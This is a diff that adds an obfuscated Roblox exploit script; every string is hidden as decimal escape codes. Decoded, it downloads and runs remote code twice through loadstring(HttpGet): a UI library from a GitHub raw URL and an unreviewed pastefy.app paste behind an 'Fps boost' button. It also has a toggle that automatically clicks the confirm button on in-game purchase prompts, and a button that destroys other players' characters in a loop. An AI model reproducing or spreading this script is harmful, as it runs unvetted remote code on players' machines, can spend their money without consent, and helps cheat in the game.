@@ -1,0 +1,107 @@
+local a=game:GetService("\83\116\97\114\116\101\114\71\117\105")
+a:SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110",{
+    Title="\73\32\97\109\32\104\101\114\101";
+    Text="\33\33";
+    Duration=5
+})
+
+local b=loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\116\104\105\110\107\97\98\111\117\116\99\114\121\47\98\97\99\107\45\117\112\45\47\104\101\97\100\115\47\109\97\105\110\47\119\105\122\97\114\100"))()
+
+local c=b:NewWindow("\97\116\32\108\101\97\115\116\32\115\97\121\32\116\104\120")
+
+local d=c:NewSection("\77\97\105\110")
+local e=c:NewSection("\79\116\104\101\114")
+local f=c:NewSection("\100\111\32\121\111\117\32\108\111\118\101\32\109\101\32\63")
+
+getgenv()._x1=false
+getgenv()._x2=false
+
+function _y1()
+    spawn(function()
+        local g=game:GetService("\67\111\114\101\71\117\105"):FindFirstChild("\80\117\114\99\104\97\115\101\80\114\111\109\112\116\65\112\112") or game:GetService("\67\111\114\101\71\117\105").PurchasePrompt
+        while getgenv()._x1 do
+            task.wait()
+            local h
+            pcall(function()
+                h=g.ProductPurchaseContainer.Animator:FindFirstChild("\80\114\111\100\117\99\116\80\117\114\99\104\97\115\101\77\111\100\97\108")
+            end)
+            if h and h:FindFirstChild("\65\108\101\114\116\67\111\110\116\101\110\116\115") then
+                local i=h.AlertContents:FindFirstChild("\70\111\111\116\101\114")
+                if i and i:FindFirstChild("\66\117\116\116\111\110\115") then
+                    local j=i.Buttons:FindFirstChild("1")
+                    if j and j:FindFirstChild("\66\117\116\116\111\110\67\111\110\116\101\110\116") and j.ButtonContent:FindFirstChild("\66\117\116\116\111\110\77\105\100\100\108\101\67\111\110\116\101\110\116") then
+                        local k=j.AbsolutePosition
+                        local l=game:GetService("\86\105\114\116\117\97\108\73\110\112\117\116\77\97\110\97\103\101\114")
+                        l:SendMouseButtonEvent(k.X+150,k.Y+65.5,0,true,game,1)
+                        task.wait()
+                        l:SendMouseButtonEvent(k.X+150,k.Y+65.5,0,false,game,1)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+function _y2()
+    spawn(function()
+        local m=game:GetService("\67\111\114\101\71\117\105"):FindFirstChild("\80\117\114\99\104\97\115\101\80\114\111\109\112\116\65\112\112") or game:GetService("\67\111\114\101\71\117\105").PurchasePrompt
+        while getgenv()._x2 do
+            task.wait()
+            local n
+            pcall(function()
+                n=m.ProductPurchaseContainer.Animator:FindFirstChild("\80\114\111\109\112\116")
+            end)
+            if n and n:FindFirstChild("\65\108\101\114\116\67\111\110\116\101\110\116\115") then
+                local o=n.AlertContents:FindFirstChild("\70\111\111\116\101\114")
+                if o and o:FindFirstChild("\66\117\116\116\111\110\115") then
+                    local p=o.Buttons:FindFirstChild("1")
+                    if p and p:FindFirstChild("\66\117\116\116\111\110\67\111\110\116\101\110\116") and p.ButtonContent:FindFirstChild("\66\117\116\116\111\110\77\105\100\100\108\101\67\111\110\116\101\110\116") then
+                        local q=p.AbsolutePosition
+                        local r=game:GetService("\86\105\114\116\117\97\108\73\110\112\117\116\77\97\110\97\103\101\114")
+                        r:SendMouseButtonEvent(q.X+150,q.Y+65.5,0,true,game,1)
+                        task.wait()
+                        r:SendMouseButtonEvent(q.X+150,q.Y+65.5,0,false,game,1)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+d:CreateToggle("\65\117\116\111\32\80\117\114\99\104\97\115\101\32\67\108\105\99\107",function(s)
+    getgenv()._x1=s
+    if s then _y1() end
+end)
+
+d:CreateToggle("\65\117\116\111\32\67\108\105\99\107\32\69\114\114\111\114",function(t)
+    getgenv()._x2=t
+    if t then _y2() end
+end)
+
+e:CreateButton("\72\105\100\101\32\80\108\97\121\101\114\115",function()
+    while true do
+        for _,u in pairs(game.Players:GetPlayers()) do
+            if u~=game.Players.LocalPlayer and u.Character then
+                u.Character:Destroy()
+            end
+        end
+        wait()
+    end
+end)
+
+e:CreateButton("\70\112\115\32\98\111\111\115\116",function()
+    _G.Settings={
+        Players={["\73\103\110\111\114\101\32\77\101"]=true,["\73\103\110\111\114\101\32\79\116\104\101\114\115"]=true},
+        Meshes={Destroy=false,LowDetail=true},
+        Images={Invisible=true,LowDetail=false,Destroy=false},
+        ["\78\111\32\80\97\114\116\105\99\108\101\115"]=true,
+        ["\78\111\32\67\97\109\101\114\97\32\69\102\102\101\99\116\115"]=true,
+        ["\78\111\32\69\120\112\108\111\115\105\111\110\115"]=true,
+        ["\78\111\32\67\108\111\116\104\101\115"]=true,
+        ["\76\111\119\32\87\97\116\101\114\32\71\114\97\112\104\105\99\115"]=true,
+        ["\78\111\32\83\104\97\100\111\119\115"]=true,
+        ["\76\111\119\32\82\101\110\100\101\114\105\110\103"]=true,
+        ["\76\111\119\32\81\117\97\108\105\116\121\32\80\97\114\116\115"]=true
+    }
+    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\101\105\107\70\90\75\115\53\47\114\97\119"))()
+end)
